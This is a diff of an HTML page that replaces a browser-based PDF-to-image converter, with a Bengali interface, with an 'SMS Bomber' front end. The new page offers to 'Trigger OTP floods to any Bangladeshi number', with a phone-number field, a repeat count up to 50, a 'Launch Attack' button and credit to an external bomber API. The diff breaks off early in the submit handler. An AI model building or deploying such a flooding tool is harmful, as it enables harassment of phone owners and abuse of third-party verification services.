@@ -1,717 +1,510 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-<title>PDF → Image</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
-<script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
-<style>
-  :root{
-    --bg:#0A0C10;
-    --surface:#12151B;
-    --surface-2:#191D25;
-    --border:#242A34;
-    --border-soft:#1C212A;
-    --text:#E9EBEF;
-    --text-dim:#8A93A3;
-    --text-faint:#525A68;
-    --amber:#FFB454;
-    --amber-dim:#8A6431;
-    --teal:#38D9C9;
-    --danger:#FF6B6B;
-    --radius:14px;
-    --radius-sm:9px;
-  }
-  *{box-sizing:border-box; -webkit-tap-highlight-color:transparent;}
-  html,body{margin:0; padding:0;}
-  body{
-    background:var(--bg);
-    color:var(--text);
-    font-family:'Inter',system-ui,sans-serif;
-    min-height:100vh;
-    -webkit-font-smoothing:antialiased;
-    padding-bottom:40px;
-  }
-  ::selection{background:var(--amber); color:#0A0C10;}
-
-  .wrap{max-width:920px; margin:0 auto; padding:0 16px;}
-
-  /* header */
-  header{
-    padding:28px 0 18px;
-    border-bottom:1px solid var(--border-soft);
-    margin-bottom:22px;
-  }
-  .brand{
-    display:flex; align-items:center; gap:10px;
-  }
-  .brand svg{flex-shrink:0;}
-  .brand h1{
-    font-family:'Space Grotesk',sans-serif;
-    font-size:20px;
-    font-weight:700;
-    letter-spacing:-0.01em;
-    margin:0;
-  }
-  .brand h1 span{color:var(--amber);}
-  .tagline{
-    color:var(--text-dim);
-    font-size:13.5px;
-    margin:6px 0 0 34px;
-    line-height:1.5;
-  }
-  .privacy-badge{
-    display:inline-flex; align-items:center; gap:7px;
-    margin:14px 0 0 34px;
-    padding:6px 11px;
-    background:rgba(56,217,201,0.08);
-    border:1px solid rgba(56,217,201,0.25);
-    border-radius:100px;
-    font-size:12px;
-    color:var(--teal);
-    font-family:'JetBrains Mono',monospace;
-  }
-  .privacy-badge svg{width:13px; height:13px; flex-shrink:0;}
-
-  /* dropzone */
-  .dropzone{
-    border:1.5px dashed var(--border);
-    border-radius:var(--radius);
-    background:var(--surface);
-    padding:44px 20px;
-    text-align:center;
-    cursor:pointer;
-    position:relative;
-    overflow:hidden;
-    transition:border-color .2s ease, background .2s ease;
-  }
-  .dropzone.drag{
-    border-color:var(--amber);
-    background:var(--surface-2);
-  }
-  .dropzone .scan-sweep{
-    position:absolute; top:0; left:-40%; width:40%; height:100%;
-    background:linear-gradient(90deg, transparent, rgba(255,180,84,0.06), transparent);
-    pointer-events:none;
-    animation:sweep 3.6s ease-in-out infinite;
-  }
-  @keyframes sweep{
-    0%{left:-40%;}
-    50%{left:100%;}
-    100%{left:100%;}
-  }
-  .dropzone-icon{
-    width:46px; height:46px;
-    margin:0 auto 16px;
-    color:var(--text-faint);
-  }
-  .dropzone h2{
-    font-family:'Space Grotesk',sans-serif;
-    font-size:16px;
-    font-weight:600;
-    margin:0 0 6px;
-  }
-  .dropzone p{
-    color:var(--text-dim);
-    font-size:13px;
-    margin:0;
-  }
-  .dropzone .browse{color:var(--amber); font-weight:500;}
-  input[type=file]{display:none;}
-
-  .filebar{
-    display:none;
-    align-items:center; gap:10px;
-    margin-top:14px;
-    padding:12px 14px;
-    background:var(--surface);
-    border:1px solid var(--border-soft);
-    border-radius:var(--radius-sm);
-  }
-  .filebar.show{display:flex;}
-  .filebar svg{width:18px; height:18px; color:var(--amber); flex-shrink:0;}
-  .filebar .fname{
-    font-family:'JetBrains Mono',monospace;
-    font-size:12.5px;
-    color:var(--text);
-    overflow:hidden; text-overflow:ellipsis; white-space:nowrap;
-    flex:1;
-  }
-  .filebar .fmeta{font-size:11.5px; color:var(--text-faint); flex-shrink:0;}
-  .filebar button{
-    background:none; border:none; color:var(--text-faint);
-    cursor:pointer; padding:4px; display:flex;
-  }
-  .filebar button:hover{color:var(--danger);}
-
-  /* controls */
-  .controls{
-    display:none;
-    margin-top:18px;
-    gap:10px;
-    flex-wrap:wrap;
-  }
-  .controls.show{display:flex;}
-  .field{
-    display:flex; flex-direction:column; gap:6px;
-    flex:1; min-width:120px;
-  }
-  .field label{
-    font-size:11px; text-transform:uppercase; letter-spacing:.05em;
-    color:var(--text-faint); font-weight:500;
-  }
-  select{
-    appearance:none;
-    background:var(--surface) url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="10" height="6" viewBox="0 0 10 6"><path d="M1 1L5 5L9 1" stroke="%238A93A3" stroke-width="1.5" fill="none" stroke-linecap="round"/></svg>') no-repeat right 12px center;
-    border:1px solid var(--border);
-    color:var(--text);
-    padding:10px 32px 10px 12px;
-    border-radius:var(--radius-sm);
-    font-size:13.5px;
-    font-family:'Inter',sans-serif;
-    cursor:pointer;
-    width:100%;
-  }
-  select:focus-visible{outline:2px solid var(--amber); outline-offset:1px;}
-
-  .btn{
-    display:inline-flex; align-items:center; justify-content:center; gap:8px;
-    border:none; border-radius:var(--radius-sm);
-    font-family:'Inter',sans-serif;
-    font-size:14px; font-weight:600;
-    padding:12px 18px;
-    cursor:pointer;
-    transition:opacity .15s ease, transform .1s ease;
-  }
-  .btn:active{transform:scale(0.98);}
-  .btn:disabled{opacity:0.4; cursor:not-allowed;}
-  .btn-primary{
-    background:var(--amber); color:#1A1103;
-    width:100%;
-  }
-  .btn-primary:hover:not(:disabled){opacity:0.92;}
-  .btn-ghost{
-    background:var(--surface-2); color:var(--text);
-    border:1px solid var(--border);
-  }
-  .btn-ghost:hover{border-color:var(--text-faint);}
-  .btn-sm{padding:8px 12px; font-size:12.5px;}
-  .btn svg{width:15px; height:15px; flex-shrink:0;}
-
-  .convert-row{margin-top:12px; display:none;}
-  .convert-row.show{display:block;}
-
-  /* progress */
-  .progress-wrap{
-    display:none;
-    margin-top:16px;
-  }
-  .progress-wrap.show{display:block;}
-  .progress-head{
-    display:flex; justify-content:space-between; align-items:baseline;
-    margin-bottom:8px;
-  }
-  .progress-status{
-    font-size:12.5px; color:var(--text-dim);
-    font-family:'JetBrains Mono',monospace;
-  }
-  .progress-pct{
-    font-size:12.5px; color:var(--amber);
-    font-family:'JetBrains Mono',monospace;
-  }
-  .progress-track{
-    height:6px; background:var(--surface-2);
-    border-radius:100px; overflow:hidden;
-    border:1px solid var(--border-soft);
-  }
-  .progress-fill{
-    height:100%; width:0%;
-    background:linear-gradient(90deg, var(--amber-dim), var(--amber));
-    border-radius:100px;
-    transition:width .25s ease;
-    position:relative;
-  }
-
-  /* results */
-  .results-head{
-    display:none;
-    justify-content:space-between; align-items:center;
-    margin-top:30px; margin-bottom:14px;
-    gap:10px; flex-wrap:wrap;
-  }
-  .results-head.show{display:flex;}
-  .results-head h3{
-    font-family:'Space Grotesk',sans-serif;
-    font-size:15px; font-weight:600; margin:0;
-    color:var(--text-dim);
-  }
-  .results-head h3 b{color:var(--text);}
-
-  .grid{
-    display:none;
-    grid-template-columns:repeat(2, 1fr);
-    gap:12px;
-  }
-  .grid.show{display:grid;}
-  @media(min-width:560px){ .grid{grid-template-columns:repeat(3,1fr);} }
-  @media(min-width:760px){ .grid{grid-template-columns:repeat(4,1fr);} }
-
-  .card{
-    background:var(--surface);
-    border:1px solid var(--border-soft);
-    border-radius:var(--radius-sm);
-    overflow:hidden;
-    display:flex; flex-direction:column;
-  }
-  .thumb{
-    aspect-ratio:3/4;
-    background:var(--surface-2);
-    display:flex; align-items:center; justify-content:center;
-    position:relative;
-    overflow:hidden;
-  }
-  .thumb img{width:100%; height:100%; object-fit:contain; display:block;}
-  .thumb .spinner{
-    width:20px; height:20px;
-    border:2px solid var(--border);
-    border-top-color:var(--amber);
-    border-radius:50%;
-    animation:spin .8s linear infinite;
-  }
-  @keyframes spin{to{transform:rotate(360deg);}}
-  .card-foot{
-    padding:8px 9px;
-    display:flex; align-items:center; justify-content:space-between;
-    gap:6px;
-  }
-  .card-foot .pnum{
-    font-family:'JetBrains Mono',monospace;
-    font-size:11px; color:var(--text-dim);
-  }
-  .card-foot button{
-    background:none; border:none; color:var(--text-faint);
-    cursor:pointer; padding:3px; display:flex; border-radius:6px;
-  }
-  .card-foot button:hover:not(:disabled){color:var(--amber); background:var(--surface-2);}
-  .card-foot button:disabled{opacity:0.3; cursor:default;}
-  .card-foot button svg{width:16px; height:16px;}
-
-  footer{
-    margin-top:40px;
-    padding-top:16px;
-    border-top:1px solid var(--border-soft);
-    font-size:11.5px; color:var(--text-faint);
-    text-align:center;
-    font-family:'JetBrains Mono',monospace;
-  }
-
-  .sr-only{position:absolute; width:1px; height:1px; overflow:hidden; clip:rect(0,0,0,0);}
-
-  @media(prefers-reduced-motion:reduce){
-    .scan-sweep, .spinner{animation:none !important;}
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SMS Bomber</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: #0f1117;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      color: #e8edf5;
+      padding: 24px;
+      line-height: 1.5;
+    }
+    body::before {
+      content: '';
+      position: fixed;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle at 30% 40%, rgba(240, 179, 75, 0.04) 0%, transparent 50%),
+                  radial-gradient(circle at 70% 60%, rgba(232, 131, 74, 0.04) 0%, transparent 50%);
+      animation: drift 20s infinite alternate ease-in-out;
+      z-index: -1;
+    }
+    @keyframes drift {
+      0% { transform: translate(0, 0) rotate(0deg); }
+      100% { transform: translate(2%, 3%) rotate(3deg); }
+    }
+    .card {
+      background: rgba(22, 25, 35, 0.88);
+      backdrop-filter: blur(14px);
+      -webkit-backdrop-filter: blur(14px);
+      border-radius: 40px;
+      padding: 44px 40px;
+      max-width: 640px;
+      width: 100%;
+      box-shadow: 0 30px 80px rgba(0,0,0,0.7), inset 0 1px 1px rgba(255,255,255,0.04);
+      border: 1px solid rgba(255,255,255,0.03);
+      transition: transform 0.3s ease, box-shadow 0.4s ease;
+      animation: cardIn 0.6s cubic-bezier(0.23, 1, 0.32, 1);
+    }
+    .card:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 40px 90px rgba(0,0,0,0.85);
+    }
+    @keyframes cardIn {
+      0% { opacity: 0; transform: scale(0.96) translateY(20px); }
+      100% { opacity: 1; transform: scale(1) translateY(0); }
+    }
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 8px;
+    }
+    .header-icon {
+      font-size: 32px;
+      color: #f0b34b;
+      filter: drop-shadow(0 0 10px rgba(240,179,75,0.25));
+    }
+    h1 {
+      font-size: 30px;
+      font-weight: 700;
+      background: linear-gradient(135deg, #f0b34b 0%, #ff7a5c 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      background-clip: text;
+      letter-spacing: -0.5px;
+    }
+    .subtitle {
+      font-size: 15px;
+      color: #9aa2b5;
+      margin-bottom: 30px;
+      padding-left: 52px;
+      border-left: 3px solid #f0b34b;
+      padding-left: 16px;
+      opacity: 0.9;
+    }
+    .subtitle i {
+      margin-right: 8px;
+      color: #f0b34b;
+    }
+    .form-group {
+      margin-bottom: 22px;
+    }
+    label {
+      display: block;
+      font-size: 14px;
+      font-weight: 500;
+      color: #c8cedb;
+      margin-bottom: 6px;
+      letter-spacing: 0.2px;
+    }
+    label i {
+      margin-right: 8px;
+      color: #f0b34b;
+      width: 18px;
+    }
+    .input-wrapper {
+      position: relative;
+    }
+    .input-wrapper i {
+      position: absolute;
+      left: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #5a6279;
+      font-size: 16px;
+      pointer-events: none;
+    }
+    input[type="text"],
+    input[type="number"] {
+      width: 100%;
+      padding: 14px 18px 14px 44px;
+      border: 1px solid #2e3346;
+      border-radius: 20px;
+      background: #1a1d27;
+      color: #f0f0f0;
+      font-size: 16px;
+      transition: border 0.25s, box-shadow 0.25s, background 0.25s;
+      outline: none;
+    }
+    input:focus {
+      border-color: #f0b34b;
+      background: #1e212e;
+      box-shadow: 0 0 0 4px rgba(240, 179, 75, 0.12);
+    }
+    input::placeholder {
+      color: #4f5770;
+    }
+    .input-row {
+      display: flex;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+    .input-row .form-group {
+      flex: 1;
+      min-width: 120px;
+    }
+    .badge {
+      display: inline-block;
+      background: #2a2f40;
+      padding: 4px 14px;
+      border-radius: 40px;
+      font-size: 12px;
+      font-weight: 500;
+      color: #a8b1c9;
+      letter-spacing: 0.3px;
+    }
+    .badge i {
+      margin-right: 6px;
+      font-size: 11px;
+      color: #f0b34b;
+    }
+    .btn {
+      width: 100%;
+      padding: 16px 24px;
+      background: linear-gradient(135deg, #f0b34b, #e8834a);
+      border: none;
+      border-radius: 60px;
+      font-size: 18px;
+      font-weight: 600;
+      color: #14161c;
+      cursor: pointer;
+      transition: all 0.25s;
+      letter-spacing: 0.3px;
+      box-shadow: 0 8px 28px rgba(232, 131, 74, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+    }
+    .btn i {
+      font-size: 18px;
+      transition: transform 0.3s;
+    }
+    .btn:hover:not(:disabled) {
+      transform: scale(1.02);
+      box-shadow: 0 12px 36px rgba(232, 131, 74, 0.5);
+    }
+    .btn:hover:not(:disabled) i {
+      transform: translateX(4px) rotate(-10deg);
+    }
+    .btn:active:not(:disabled) {
+      transform: scale(0.96);
+    }
+    .btn:disabled {
+      opacity: 0.6;
+      cursor: not-allowed;
+      box-shadow: none;
+    }
+    .result-box {
+      margin-top: 32px;
+      padding: 22px 24px;
+      border-radius: 24px;
+      background: rgba(0, 0, 0, 0.35);
+      border-left: 5px solid #f0b34b;
+      animation: fadeSlide 0.5s ease;
+    }
+    .result-box.error {
+      border-left-color: #ff5c5c;
+      background: rgba(255, 92, 92, 0.08);
+    }
+    .result-box.success {
+      border-left-color: #4caf50;
+      background: rgba(76, 175, 80, 0.08);
+    }
+    @keyframes fadeSlide {
+      0% { opacity: 0; transform: translateY(18px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+    .result-title {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 12px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .result-title i {
+      font-size: 22px;
+    }
+    .result-title .fa-circle-check { color: #4caf50; }
+    .result-title .fa-circle-xmark { color: #ff5c5c; }
+    .result-stats {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 14px 30px;
+      margin-top: 8px;
+    }
+    .stat-item {
+      font-size: 15px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+    .stat-item i {
+      width: 20px;
+      color: #f0b34b;
+      font-size: 14px;
+    }
+    .stat-item strong {
+      color: #f0b34b;
+      font-weight: 600;
+    }
+    .stat-item .green { color: #6fcf97; }
+    .stat-item .red { color: #ff5c5c; }
+    .detail-list {
+      margin-top: 16px;
+      max-height: 180px;
+      overflow-y: auto;
+      font-size: 13px;
+      color: #b0b8c9;
+      background: rgba(0,0,0,0.2);
+      padding: 12px 16px;
+      border-radius: 16px;
+      border: 1px solid #282e3d;
+    }
+    .detail-list::-webkit-scrollbar {
+      width: 5px;
+    }
+    .detail-list::-webkit-scrollbar-track {
+      background: transparent;
+    }
+    .detail-list::-webkit-scrollbar-thumb {
+      background: #4a5064;
+      border-radius: 10px;
+    }
+    .detail-item {
+      padding: 6px 0;
+      border-bottom: 1px solid #252a38;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .detail-item:last-child {
+      border-bottom: none;
+    }
+    .detail-item i {
+      color: #f0b34b;
+      font-size: 12px;
+      width: 16px;
+    }
+    .detail-item .fa-check-circle { color: #4caf50; }
+    .detail-item .fa-times-circle { color: #ff5c5c; }
+    .footer {
+      margin-top: 36px;
+      text-align: center;
+      font-size: 14px;
+      color: #5f6679;
+      border-top: 1px solid #262b3b;
+      padding-top: 22px;
+      width: 100%;
+      max-width: 640px;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 12px 28px;
+    }
+    .footer a {
+      color: #a8b1c9;
+      text-decoration: none;
+      transition: color 0.2s;
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+    .footer a:hover {
+      color: #f0b34b;
+    }
+    .footer i {
+      font-size: 14px;
+    }
+    .footer .copyright {
+      color: #4f5770;
+      font-size: 13px;
+    }
+    .footer .credit {
+      color: #f0b34b;
+      font-weight: 500;
+    }
+    .footer .credit a {
+      color: #f0b34b;
+      text-decoration: underline;
+    }
+    .loader {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(255,255,255,0.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin 0.8s ease infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    @media (max-width: 500px) {
+      .card { padding: 28px 18px; }
+      h1 { font-size: 24px; }
+      .header-icon { font-size: 26px; }
+      .subtitle { font-size: 13px; padding-left: 0; border-left: none; }
+      .input-row { flex-direction: column; }
+    }
+  </style>
 </head>
 <body>
-
-<div class="wrap">
-
-  <header>
-    <div class="brand">
-      <svg width="26" height="26" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <rect x="3" y="2" width="13" height="17" rx="1.5" stroke="#FFB454" stroke-width="1.6"/>
-        <path d="M16 6H20.5C21.3284 6 22 6.67157 22 7.5V19.5C22 20.3284 21.3284 21 20.5 21H9.5C8.67157 21 8 20.3284 8 19.5V19" stroke="#525A68" stroke-width="1.6"/>
-        <path d="M6.5 9.5H12.5M6.5 12.5H12.5M6.5 15.5H10" stroke="#FFB454" stroke-width="1.4" stroke-linecap="round"/>
-      </svg>
-      <h1>PDF <span>→</span> Image</h1>
-    </div>
-    <p class="tagline">প্রতিটা পেজকে শার্প, হাই-রেজোলিউশন PNG বা JPEG-এ কনভার্ট করুন — সরাসরি আপনার ব্রাউজারে।</p>
-    <div class="privacy-badge">
-      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2L4 5V11C4 16 7.5 20.5 12 22C16.5 20.5 20 16 20 11V5L12 2Z" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round"/><path d="M9 12L11 14L15.5 9.5" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      কোনো ফাইল সার্ভারে যায় না — ১০০% অন-ডিভাইস প্রসেসিং
-    </div>
-  </header>
-
-  <div class="dropzone" id="dropzone" tabindex="0" role="button" aria-label="Upload PDF">
-    <div class="scan-sweep" aria-hidden="true"></div>
-    <svg class="dropzone-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <path d="M12 15V4M12 4L8 8M12 4L16 8" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
-      <path d="M4 15V17.5C4 18.8807 5.11929 20 6.5 20H17.5C18.8807 20 20 18.8807 20 17.5V15" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/>
-    </svg>
-    <h2>PDF ফাইল ড্রপ করুন</h2>
-    <p>অথবা <span class="browse">ব্রাউজ করে বেছে নিন</span> — শুধু .pdf</p>
-    <input type="file" id="fileInput" accept="application/pdf,.pdf">
+<div class="card">
+  <div class="header">
+    <span class="header-icon"><i class="fas fa-bolt"></i></span>
+    <h1>SMS Bomber</h1>
+  </div>
+  <div class="subtitle">
+    <i class="fas fa-arrow-right"></i> Trigger OTP floods to any Bangladeshi number
   </div>
 
-  <div class="filebar" id="filebar">
-    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="4" y="2" width="16" height="20" rx="1.5" stroke="currentColor" stroke-width="1.6"/><path d="M8 8H16M8 12H16M8 16H12" stroke="currentColor" stroke-width="1.4" stroke-linecap="round"/></svg>
-    <span class="fname" id="fname"></span>
-    <span class="fmeta" id="fmeta"></span>
-    <button id="clearFile" aria-label="Remove file">
-      <svg viewBox="0 0 24 24" fill="none" width="17" height="17" xmlns="http://www.w3.org/2000/svg"><path d="M6 6L18 18M6 18L18 6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/></svg>
+  <form id="bomber-form" onsubmit="return handleSubmit(event)">
+    <div class="form-group">
+      <label for="phone"><i class="fas fa-phone-alt"></i>Phone Number (11 digits)</label>
+      <div class="input-wrapper">
+        <i class="fas fa-mobile-alt"></i>
+        <input type="text" id="phone" name="phone" placeholder="e.g. 01712345678" required pattern="[0-9]{11}" maxlength="11" autofocus />
+      </div>
+    </div>
+
+    <div class="input-row">
+      <div class="form-group">
+        <label for="count"><i class="fas fa-repeat"></i>Number of times</label>
+        <div class="input-wrapper">
+          <i class="fas fa-sync-alt"></i>
+          <input type="number" id="count" name="count" value="1" min="1" max="50" step="1" />
+        </div>
+      </div>
+      <div class="form-group" style="flex: 0 0 auto; align-self: flex-end;">
+        <span class="badge"><i class="fas fa-info-circle"></i>Max 50</span>
+      </div>
+    </div>
+
+    <button type="submit" id="submitBtn" class="btn">
+      <i class="fas fa-rocket"></i> Launch Attack
     </button>
-  </div>
+  </form>
 
-  <div class="controls" id="controls">
-    <div class="field">
-      <label for="fmtSelect">ফরম্যাট</label>
-      <select id="fmtSelect">
-        <option value="jpeg" selected>JPEG — দ্রুত</option>
-        <option value="png">PNG (লসলেস, ধীর)</option>
-      </select>
-    </div>
-    <div class="field">
-      <label for="scaleSelect">রেজোলিউশন</label>
-      <select id="scaleSelect">
-        <option value="1.2" selected>1.2x — সবচেয়ে ফাস্ট</option>
-        <option value="1.5">1.5x — ফাস্ট + ভালো মান</option>
-        <option value="2">2x — স্ট্যান্ডার্ড</option>
-        <option value="3">3x — হাই কোয়ালিটি (ধীর)</option>
-        <option value="4">4x — প্রিন্ট গ্রেড (সবচেয়ে ধীর)</option>
-      </select>
-    </div>
-    <div class="field" id="qualityField" style="display:flex;">
-      <label for="qualitySelect">JPEG কোয়ালিটি</label>
-      <select id="qualitySelect">
-        <option value="0.35">35% — সবচেয়ে ছোট সাইজ</option>
-        <option value="0.5" selected>50% — ছোট + দ্রুত (রিকমেন্ডেড)</option>
-        <option value="0.6">60%</option>
-        <option value="0.75">75%</option>
-        <option value="0.85">85%</option>
-      </select>
-    </div>
-  </div>
+  <div id="resultContainer"></div>
+</div>
 
-  <div class="convert-row" id="convertRow">
-    <button class="btn btn-primary" id="convertBtn">
-      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M13 2L4 14H11L10 22L20 9H13L13 2Z" stroke="currentColor" stroke-width="1.6" stroke-linejoin="round" stroke-linecap="round" fill="none"/></svg>
-      কনভার্ট শুরু করুন
-    </button>
-  </div>
-
-  <div class="progress-wrap" id="progressWrap">
-    <div class="progress-head">
-      <span class="progress-status" id="progressStatus">প্রসেস হচ্ছে...</span>
-      <span class="progress-pct" id="progressPct">0%</span>
-    </div>
-    <div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
-  </div>
-
-  <div class="results-head" id="resultsHead">
-    <h3><b id="pageCount">0</b> পেজ কনভার্ট হয়েছে</h3>
-    <button class="btn btn-ghost btn-sm" id="downloadAllBtn">
-      <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 15V17.5C4 18.8807 5.11929 20 6.5 20H17.5C18.8807 20 20 18.8807 20 17.5V15" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/><path d="M12 4V15M12 15L8 11M12 15L16 11" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      সব ডাউনলোড (ZIP)
-    </button>
-  </div>
-
-  <div class="grid" id="grid"></div>
-
-  <footer>local-processing · no-upload · pdf.js + jszip</footer>
+<div class="footer">
+  <span><i class="fas fa-code"></i> Powered by <a href="https://sms-bmbr-api.vercel.app" target="_blank">SMS Bomber API</a></span>
+  <span class="copyright"><i class="far fa-copyright"></i> <span id="year"></span> All rights reserved</span>
+  <span class="credit"><i class="fas fa-user-astronaut"></i> Created by <a href="https://t.me/infinity_codex" target="_blank">Infinity Codex</a></span>
 </div>
 
 <script>
-if(typeof pdfjsLib !== 'undefined'){
-  pdfjsLib.GlobalWorkerOptions.workerSrc = 'https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.11.174/pdf.worker.min.js';
-}
+  document.getElementById('year').textContent = new Date().getFullYear();
 
-const dropzone = document.getElementById('dropzone');
-const fileInput = document.getElementById('fileInput');
-const filebar = document.getElementById('filebar');
-const fnameEl = document.getElementById('fname');
-const fmetaEl = document.getElementById('fmeta');
-const clearFileBtn = document.getElementById('clearFile');
-const controls = document.getElementById('controls');
-const convertRow = document.getElementById('convertRow');
-const convertBtn = document.getElementById('convertBtn');
-const fmtSelect = document.getElementById('fmtSelect');
-const scaleSelect = document.getElementById('scaleSelect');
-const qualityField = document.getElementById('qualityField');
-const qualitySelect = document.getElementById('qualitySelect');
-const progressWrap = document.getElementById('progressWrap');
-const progressStatus = document.getElementById('progressStatus');
-const progressPct = document.getElementById('progressPct');
-const progressFill = document.getElementById('progressFill');
-const resultsHead = document.getElementById('resultsHead');
-const pageCountEl = document.getElementById('pageCount');
-const downloadAllBtn = document.getElementById('downloadAllBtn');
-const grid = document.getElementById('grid');
+  async function handleSubmit(event) {
+    event.preventDefault();
+    const phoneInput = document.getElementById('phone');
+    const countInput = document.getElementById('count');
+    const submitBtn = document.getElementById('submitBtn');
+    const resultContainer = document.getElementById('resultContainer');
 
-let currentFile = null;
-let pdfDoc = null;       // loaded pdf.js document, kept for on-demand full-res render
-let totalPages = 0;
-let fullResCache = {};   // idx -> {blob, url, ext}  (filled lazily, only when actually downloaded)
-const THUMB_WIDTH = 140; // px — preview only, kept tiny so the first pass is instant
-const MAX_LONG_EDGE = 1400; // px — hard cap on the export's longer side, keeps file size predictable
-                             // even for oversized PDF pages, regardless of the scale picked
+    const phone = phoneInput.value.replace(/\D/g, '');
+    let count = parseInt(countInput.value) || 1;
+    if (count < 1) count = 1;
+    if (count > 50) count = 50;
 
-function fmtBytes(b){
-  if(b < 1024) return b + ' B';
-  if(b < 1024*1024) return (b/1024).toFixed(1) + ' KB';
-  return (b/(1024*1024)).toFixed(2) + ' MB';
-}
-
-// yield one frame so the mobile UI thread doesn't lock up during long loops
-function nextFrame(){
-  return new Promise(r => requestAnimationFrame(r));
-}
-
-function resetResults(){
-  pdfDoc = null;
-  totalPages = 0;
-  fullResCache = {};
-  grid.innerHTML = '';
-  grid.classList.remove('show');
-  resultsHead.classList.remove('show');
-  progressWrap.classList.remove('show');
-  progressFill.style.background = 'linear-gradient(90deg, var(--amber-dim), var(--amber))';
-}
-
-function handleFile(file){
-  if(!file) return;
-  const looksLikePdf = file.type === 'application/pdf' || file.name.toLowerCase().endsWith('.pdf');
-  if(!looksLikePdf){
-    alert('শুধু .pdf ফাইল আপলোড করা যাবে।');
-    return;
-  }
-  currentFile = file;
-  fnameEl.textContent = file.name;
-  fmetaEl.textContent = fmtBytes(file.size);
-  filebar.classList.add('show');
-  controls.classList.add('show');
-  convertRow.classList.add('show');
-  resetResults();
-}
-
-dropzone.addEventListener('click', () => fileInput.click());
-dropzone.addEventListener('keydown', e => { if(e.key === 'Enter' || e.key === ' ') fileInput.click(); });
-fileInput.addEventListener('change', e => { if(e.target.files[0]) handleFile(e.target.files[0]); });
-
-['dragenter','dragover'].forEach(evt => {
-  dropzone.addEventListener(evt, e => { e.preventDefault(); dropzone.classList.add('drag'); });
-});
-['dragleave','drop'].forEach(evt => {
-  dropzone.addEventListener(evt, e => { e.preventDefault(); dropzone.classList.remove('drag'); });
-});
-dropzone.addEventListener('drop', e => {
-  const file = e.dataTransfer.files[0];
-  if(file) handleFile(file);
-});
-
-clearFileBtn.addEventListener('click', e => {
-  e.stopPropagation();
-  currentFile = null;
-  fileInput.value = '';
-  filebar.classList.remove('show');
-  controls.classList.remove('show');
-  convertRow.classList.remove('show');
-  resetResults();
-});
-
-fmtSelect.addEventListener('change', () => {
-  qualityField.style.display = fmtSelect.value === 'jpeg' ? 'flex' : 'none';
-});
-
-function canvasToBlob(canvas, type, quality){
-  return new Promise(resolve => canvas.toBlob(resolve, type, quality));
-}
-
-function currentSettings(){
-  const scale = parseFloat(scaleSelect.value);
-  const format = fmtSelect.value;
-  const quality = parseFloat(qualitySelect.value);
-  const mime = format === 'png' ? 'image/png' : 'image/jpeg';
-  const ext = format === 'png' ? 'png' : 'jpg';
-  return { scale, format, quality, mime, ext };
-}
-
-// STEP 1 — fast pass: load the PDF and paint small thumbnails only.
-// Full-resolution rendering is deferred to download time (see renderFullRes)
-// so opening a 35+ page file stays quick and doesn't hold dozens of
-// full-size canvases/PNGs in memory at once.
-async function convertPdf(){
-  if(!currentFile) return;
-  convertBtn.disabled = true;
-  resetResults();
-  progressWrap.classList.add('show');
-  progressStatus.textContent = 'PDF লোড হচ্ছে...';
-  progressPct.textContent = '0%';
-  progressFill.style.width = '0%';
-
-  try{
